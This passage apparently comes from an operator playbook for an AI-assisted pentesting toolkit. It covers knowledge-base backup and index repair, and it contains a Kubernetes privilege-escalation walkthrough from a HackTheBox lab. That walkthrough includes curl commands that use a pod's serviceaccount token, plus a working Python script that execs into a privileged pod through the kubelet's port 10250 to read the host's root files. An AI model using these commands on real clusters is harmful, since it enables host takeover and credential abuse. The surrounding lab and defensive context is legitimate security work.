  only. Never retain credentials, tokens, cookies, private keys, target-specific proof blobs, raw
  flags, or live target addresses.
- **Sedna**: only the cases with transferable strategic value, plus the engagement journal
  and proof lifecycle.
- **Fallback**: whenever `sedna_retrieve_knowledge` comes back empty or generic.

## KB Backup / Restore (script riutilizzabile)

La KB vive in `~/.hermes/knowledge/sedna/`; l'indice (`indexes/`) è **disposable by
design** (si ricostruisce dai manifest), quindi il backup "vero" è la conoscenza
canonica (`manifests/` + `semantic_bundles/`). Script pronto e testato:

```bash
~/sedna/scripts/backup_kb.sh backup            # core: manifests + semantic_bundles
~/sedna/scripts/backup_kb.sh backup --full     # tutto (anche indexes, engagements, quarantine)
~/sedna/scripts/backup_kb.sh restore <dir>      # ripristina (con backup pre-restore)
~/sedna/scripts/backup_kb.sh list              # elenca backup
~/sedna/scripts/backup_kb.sh verify            # verifica integrità KB live
```

- Default backup dir: `~/sedna-kb-backups/` (override `SEDNA_BACKUP_ROOT`); KB root
  override `SEDNA_KB_ROOT`.
- Dopo un restore, ricostruire l'indice: `sedna_knowledge_maintenance(operation="rebuild")`
  (o `~/sedna/rebuild_index.py`), poi `operation="audit"`.
- Il "source of truth" più portabile resta il repo dei writeup
  (`~/htb-writeups/write-ups/`) + i bundle agentici
  (`~/sedna/scripts/agent-populate/bundles/*.json`): da quelli la KB si ricostruisce
  da zero con `agent_relearn.py`.

## Retrieval shows `retrieval_unavailable` — the persistent marker

Symptom: `sedna_retrieve_knowledge` returns
`knowledge_gap.code="retrieval_unavailable"` even after a clean
`sedna_knowledge_maintenance(operation="rebuild")` says `succeeded:true`,
and `indexes/.retrieval.sqlite.unavailable` keeps coming back.

Root cause: at runtime open, `HadesKnowledgeRuntime.create` runs
`opening_audit = maintenance.audit()` and, if it fails OR reports
`rebuild_required`, calls `index.mark_rebuild_required()` which writes the
marker. A gateway restart does **not** delete the marker file — it is a
persistent on-disk sentinel. The script-level audit can pass while the in-gateway
open still trips, because the runtime audit is separate.

Fix (what actually worked):
1. `sedna_knowledge_maintenance(operation="rebuild")` — this is the gateway-context
   rebuild that rebuilds the index AND removes the marker (a plain script rebuild
   via `rebuild_index.py` leaves/relies on the marker differently).
2. Verify the marker is gone: `ls indexes/ | grep -i unavailable` → nothing.
3. Re-run `sedna_retrieve_knowledge` — it now returns ranked lanes instead of
   `retrieval_unavailable`.

Do NOT delete the marker by hand and expect it to stay gone if the index is
actually inconsistent — the runtime audit will re-write it. Rebuild first, then the
marker removal is durable.

## Kubernetes / k3s Privilege Escalation via `nodes/proxy` (IMPORTANT — validated on HTB "Fireflow")

If after pod-level RCE you land in a Kubernetes pod and need host root, the highest-value
permission to hunt for is **`get` on `nodes/proxy`** (revealed by a
`SelfSubjectRulesReview`). This permission is extremely dangerous because it lets you
reach the kubelet **directly on the node's port 10250** and issue an **exec websocket**
against any pod — including a *privileged* pod that mounts the host root.

### 1. Enumerate your ServiceAccount permissions
```
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
API=https://10.43.0.1:443   # from KUBERNETES_SERVICE_HOST
curl -sk -H "Authorization: Bearer $TOKEN" "$API/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
  -H "Content-Type: application/json" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}'
# look for: {'verbs':['get'],'apiGroups':[''],'resources':['nodes/proxy']}
```

### 2. Find a privileged pod that mounts the host root
Pull the kubelet pod list and grep every container's securityContext + hostPath volumes:
```
curl -sk -H "Authorization: Bearer $TOKEN" "https://10.129.x.x:10250/pods"
```
The winning pod looks like `securityContext.privileged: true` with
`volumes: [{hostPath: {path: '/'}}, {hostPath:{path:'/proc'}}, {hostPath:{path:'/sys'}}]`.
On Fireflow this was `monitoring/prometheus-prometheus-node-exporter-nmntq`,
whose container `node-exporter` runs privileged and mounts host `/` under `/host/root`
(plus `/host/proc`, `/host/sys`).

### 3. Exec into the privileged pod via a direct websocket to port 10250
Use Python `websockets` (v16+): `additional_headers` for auth and
subprotocol `v4.channel.k8s.io`. **Key detail:** pass `output=1&error=1`
(because `stdin=1&stdout=1&stderr=1` fails with `400 you must specify at least 1 of
stdin, stdout, stderr` and RBAC only needs the SA's `nodes/proxy`, NOT `pods/exec`),
and **strip the first byte** of each received frame (`data[1:]`) — it is the channel id.
```python
# kube_exec.py  (run from inside the pod)
import asyncio, ssl, sys, websockets
NODE="10.129.x.x"; NS="monitoring"; POD="prometheus-prometheus-node-exporter-nmntq"; CNT="node-exporter"
TOKEN=open('/var/run/secrets/kubernetes.io/serviceaccount/token').read().strip()
COMMAND=sys.argv[1] if len(sys.argv)>1 else "id"
async def ws_exec(cmd_parts):
    ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
    args="&".join(f"command={p}" for p in cmd_parts)
    url=(f"wss://{NODE}:10250/exec/{NS}/{POD}/{CNT}?output=1&error=1&{args}")
    async with websockets.connect(url, ssl=ctx,
            additional_headers={"Authorization": f"Bearer {TOKEN}"},
            subprotocols=["v4.channel.k8s.io"], open_timeout=10) as ws:
        try:
            while True:
                data=await asyncio.wait_for(ws.recv(), timeout=5)
                if isinstance(data,bytes) and len(data)>1:
                    sys.stdout.write(data[1:].decode("utf-8",errors="replace")); sys.stdout.flush()
        except (asyncio.TimeoutError, websockets.exceptions.ConnectionClosed): pass
asyncio.run(ws_exec(COMMAND.split()))
```
Then read the flag: `python3 kube_exec.py "cat /host/root/root/root.txt"`.
(On Fireflow the node-exporter pod was at `10.129.x.x`, reachable directly; the node IP
is the machine IP from the kubelet `/pods` list / your Nmap results.)

### Pitfalls (learned the hard way)
- **Do NOT try to exec through the API server proxy** (`/api/v1/nodes/<n>/proxy/exec/...`)
  when you only have `get nodes/proxy`: that path requires `create pods/exec` →
  `403` (and `create pods/exec` will also come back False in the SSAR). Go **directly to
  the node's `:10250`** where the SA's `nodes/proxy` permission is sufficient.
- **Param names matter:** `stdin=/stdout=/stderr=` → `400 "you must specify at least 1
  of stdin, stdout, stderr"`. Use `output=1&error=1` (legacy kubelet exec params).
- **Channel byte:** the first frame byte is the stream/channel id — strip `data[1:]`
  or you'll get garbage/other-stream data.
- Use the **node IP on port 10250** (from `/pods` entry, usually the machine IP), not the
  in-cluster API service IP `10.43.0.1`.
- This pattern is DB-sensitive but the concept is generic to any cluster where a SA has
  `nodes/proxy` and an admin has left a privileged pod running with host `/` mounted.

## Pitfalls

- **Hermes↔Hades handler ABI:** Hermes dispatches plugin handlers as
  `handler(args_dict, session_id=..., task_id=..., user_task=...)` and requires
  a string result. Hades engagement handlers accept only `**kwargs` and return
  dictionaries. The user-plugin shim at `~/.hermes/plugins/sedna/__init__.py`
  must wrap Hades-style registrations: convert the positional mapping to kwargs,
  let trusted runtime `session_id`/`task_id` override payload values, omit
  `user_task` (engagement models forbid extras), and JSON-serialize non-string
  results. Validate in a fresh process with `PluginManager.discover_and_load()`
  plus `registry.dispatch("sedna_manage_engagement", {"action": "list"}, ...)`.
  Plugin discovery occurs only at gateway startup, so after changing the shim
  the operator must run `hermes gateway restart` from a separate shell; the
  agent terminal is hardline-blocked from restarting it.
- **Unsettled Evidence:** Never call `verify` or `close` while background MCP scans are running. Resolve stuck calls via `sedna_manage_engagement(action="resolve_call", call_id=..., resolution="abandoned", reason=...)`.
- **Target Syntax Errors:** Sedna rejects invalid IP syntax (e.g. `300.1.1.1`) before searching. Validate addresses first.
- **Cross-Lane Comparison:** Do NOT compare scores between `references` and `case_steps`. Each lane uses distinct score normalization.
- **Authorized HTB flag delivery vs publication:** Raw user/root flags from an explicitly authorized HTB target must always be printed in the operator chat immediately after acquisition and in the final completion summary; they are not chat secrets. They must still never be passed to `sedna_learn_local`, public notes/reports, Hindsight, or promoted KB artifacts. Sedna's promotion saga strips private proof blobs, but private storage must never suppress chat delivery.

## Verification Checklist

- [ ] Container `hexstrike-kali` is reachable on `127.0.0.1:8888`.
- [ ] Documentation ingested with `sedna_learn_local` returns `verified`.
- [ ] Engagement initialized with explicit `required_proofs`.
- [ ] 4-lane retrieval queried and verified before active scanning.
- [ ] MCP scans executed and automatically captured by Sedna hooks.
- [ ] Strategic decisions committed via `sedna_record_decision`.
- [ ] Engagement closed, verified, and promoted without saga failure.
- [ ] `pt-report.py` rendered and verified on Tailnet URL.
- [ ] Procedure gates G1–G14 consulted before target-facing actions, and any gate that fired
      is cited by id in the logbook.
- [ ] Every fired payload had its artifact proven non-empty **in the same command**, with size
      and sha256 recorded beside the response (G1).
- [ ] Every claimed execution is backed by an independently observable effect, not by a
      response code (G2).
- [ ] Endpoint shape variants tested and recorded before any exploitability conclusion (G3).
- [ ] No route closed by an estimate; closures are measurements only (G4).
- [ ] Failed primitives tracked as priority blocks until resolved or proven impossible (G5).
- [ ] Every recovered secret tested once against every principal class, enumerated (G6).
- [ ] Every claimed absence names the filter used; narrow-filter conclusions labelled inferred (G7).
- [ ] Durable knowledge persisted outliving its lane, retain **verified**; logbook entry numbers
      unique (`sort | uniq -d` empty) (G9, G10).
- [ ] Authorization claims verified by the top-level session; journal corrections appended,
      never rewritten; target left with the original state proven restored (G11).
- [ ] Values received from another lane, a brief or a handoff re-measured before being recorded,
      with received vs measured reported separately when they differ (G12).
- [ ] Artifact validity established by **parsing the content** — never by file size and never by
      a guessed magic byte; the check can refuse and records nothing when it does (G13).
- [ ] Absence of a capability in a self-hosted product established from its **routing table or
      source**, not from 404s on guessed paths (G14).